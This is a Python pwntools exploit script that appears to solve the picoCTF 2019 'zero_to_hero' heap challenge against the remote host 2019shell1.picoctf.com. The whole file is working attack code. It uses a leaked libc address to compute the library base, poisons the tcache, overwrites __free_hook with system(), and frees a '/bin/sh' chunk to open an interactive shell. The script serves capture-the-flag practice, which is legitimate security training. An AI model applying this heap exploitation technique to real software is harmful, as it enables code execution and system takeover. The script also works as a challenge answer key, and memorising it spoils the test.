#!/usr/bin/env python2
from pwn import *

context.binary = "./zero_to_hero"
e = context.binary

glibc = ELF("./libc.so.6")

# p = process(e.path, env={"LD_PRELOAD": "./libc.so.6"})
p = remote("2019shell1.picoctf.com", 32279)


def u_64(b):
    return u64(b + (8 - len(b)) * "\x00")


def menu_choice(choice):
    p.recvuntil("> ")
    p.sendline(str(choice))


def add(size, content, newline=True):
    menu_choice(1)
    p.recvuntil("> ")
    p.sendline(str(size))
    p.recvuntil("> ")
    if newline:
        p.sendline(content)
    else:
        p.send(content)


def delete(chunk_id):
    menu_choice(2)
    p.recvuntil("> ")
    p.sendline(str(chunk_id))


def poison_tcache(addr, size=0x100, i=0):
    assert size >= 0x100 and size < 0x1F8
    add(size + 0x8, (size + 0x6) * str(i + 0))
    add(size + 0x8, (size + 0x6) * str(i + 1))
    delete(i + 1)
    delete(i + 0)
    add(size + 0x8, (size + 0x7) * str(i + 2))
    delete(i + 1)
    add(0xF8, p64(addr))
    add(size + 0x8, "/bin/sh\x00")


p.recvuntil("So, you want to be a hero?\n")
p.sendline("yes")
header = p.recvuntil("Take this: ")
system = int(p.recvuntil("\n", drop=True), 16)
libc = system - glibc.symbols["system"]

log.info("libc is at {}".format(hex(libc)))
free_hook = glibc.symbols["__free_hook"] + libc
log.info("__free_hook is at {}".format(hex(free_hook)))
system = glibc.symbols["system"] + libc
log.info("system is at {}".format(hex(system)))
environ = glibc.symbols["environ"] + libc
log.info("environ is at {}".format(hex(environ)))
max_chunk_size = 1032
log.info("Maximum chunk size is {}".format(hex(max_chunk_size)))

log.info("Trying to poison tcache lol")

log.info("Overwriting the __free_hook with system()")
poison_tcache(free_hook, size=0x140)
add(0x148, p64(system))

delete(1)
p.interactive()
